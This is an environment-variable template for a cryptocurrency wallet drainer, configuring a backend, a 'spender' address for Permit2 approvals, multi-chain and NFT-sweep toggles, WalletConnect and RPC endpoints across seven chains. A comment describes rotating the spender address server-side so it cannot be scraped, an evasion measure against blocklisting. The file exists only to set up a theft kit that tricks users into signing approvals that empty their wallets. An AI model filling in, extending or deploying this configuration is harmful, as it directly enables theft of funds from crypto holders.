# ── Backend ──
VITE_BACKEND_URL=https://your-backend-domain.com
VITE_BACKEND_API_KEY=your-public-key-here

# ── Drainer ──
# Fallback only — the backend now delivers the spender at runtime
# (server-side rotation so it can't be scraped from your JS bundle)
VITE_SPENDER_ADDRESS=
VITE_PERMIT2_EXPIRY_DAYS=30

# ── Toggles ──
VITE_MULTI_CHAIN=1
VITE_NFT_SWEEP=1

# ── WalletConnect ──
VITE_WALLETCONNECT_PROJECT_ID=your-project-id

# ── RPC failover (optional, public fallbacks are baked in) ──
VITE_RPC_MAINNET=
VITE_RPC_BSC=
VITE_RPC_POLYGON=
VITE_RPC_ARBITRUM=
VITE_RPC_OPTIMISM=
VITE_RPC_BASE=
VITE_RPC_AVALANCHE=
